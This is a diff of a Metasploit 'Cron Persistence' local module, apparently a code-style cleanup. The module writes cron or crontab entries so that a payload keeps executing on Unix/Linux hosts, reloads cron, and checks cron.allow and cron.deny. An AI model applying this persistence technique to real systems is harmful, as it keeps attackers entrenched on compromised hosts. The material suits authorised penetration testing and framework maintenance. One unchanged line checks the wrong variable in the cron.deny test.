@@ -14,33 +14,30 @@ class MetasploitModule < Msf::Exploit::Local
     super(
       update_info(
         info,
-        'Name'           => 'Cron Persistence',
-        'Description'    => %q(
+        'Name' => 'Cron Persistence',
+        'Description' => %q{
           This module will create a cron or crontab entry to execute a payload.
           The module includes the ability to automatically clean up those entries to prevent multiple executions.
           syslog will get a copy of the cron entry.
-        ),
-        'License'        => MSF_LICENSE,
-        'Author'         =>
-          [
-            'h00die <mike@shorebreaksecurity.com>'
-          ],
-        'Platform'       => ['unix', 'linux'],
-        'Targets'        =>
-          [
-            [ 'Cron',           { :path => '/etc/cron.d' } ],
-            [ 'User Crontab',   { :path => '/var/spool/cron' } ],
-            [ 'System Crontab', { :path => '/etc' } ]
-          ],
-        'DefaultTarget'  => 1,
-        'Arch'           => ARCH_CMD,
-        'Payload'        =>
-        {
-          'BadChars'   => "#%\x10\x13", # is for comments, % is for newline
-          'Compat'     =>
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'h00die <mike@shorebreaksecurity.com>'
+        ],
+        'Platform' => ['unix', 'linux'],
+        'Targets' => [
+          [ 'Cron', { path: '/etc/cron.d' } ],
+          [ 'User Crontab', { path: '/var/spool/cron' } ],
+          [ 'System Crontab', { path: '/etc' } ]
+        ],
+        'DefaultTarget' => 1,
+        'Arch' => ARCH_CMD,
+        'Payload' => {
+          'BadChars' => "#%\x10\x13", # is for comments, % is for newline
+          'Compat' =>
           {
-            'PayloadType'  => 'cmd',
-            'RequiredCmd'  => 'generic perl ruby python'
+            'PayloadType' => 'cmd',
+            'RequiredCmd' => 'generic perl ruby python'
           }
         },
         'DefaultOptions' => { 'WfsDelay' => 90 },
@@ -96,7 +93,7 @@ class MetasploitModule < Msf::Exploit::Local
       vprint_good("Writing #{cron_entry} to #{file_to_clean}")
       # at least on ubuntu, we need to reload cron to get this to work
       vprint_status('Reloading cron to pickup new entry')
-      cmd_exec("service cron reload")
+      cmd_exec('service cron reload')
     end
     print_status("Waiting #{datastore['WfsDelay']}sec for execution")
     Rex.sleep(datastore['WfsDelay'].to_i)
@@ -108,7 +105,7 @@ class MetasploitModule < Msf::Exploit::Local
       cmd_exec("mv #{file_to_clean}.new #{file_to_clean}")
       # replaced cmd_exec("perl -pi -e 's/.*#{flag}$//g' #{file_to_clean}") in favor of sed
       if target.name == 'User Crontab' # make sure we clean out of memory
-        cmd_exec("service cron reload")
+        cmd_exec('service cron reload')
       end
     end
   end
@@ -119,11 +116,9 @@ class MetasploitModule < Msf::Exploit::Local
     paths = ['/etc/', '/etc/cron.d/']
     paths.each do |path|
       cron_auth = read_file("#{path}cron.allow")
-      if cron_auth
-        if cron_auth =~ /^ALL$/ || cron_auth =~ /^#{Regexp.escape(user)}$/
-          vprint_good("User located in #{path}cron.allow")
-          return true
-        end
+      if cron_auth && (cron_auth =~ /^ALL$/ || cron_auth =~ /^#{Regexp.escape(user)}$/)
+        vprint_good("User located in #{path}cron.allow")
+        return true
       end
       cron_auths = read_file("#{path}cron.deny")
       if cron_auths && cron_auth =~ /^#{Regexp.escape(user)}$/
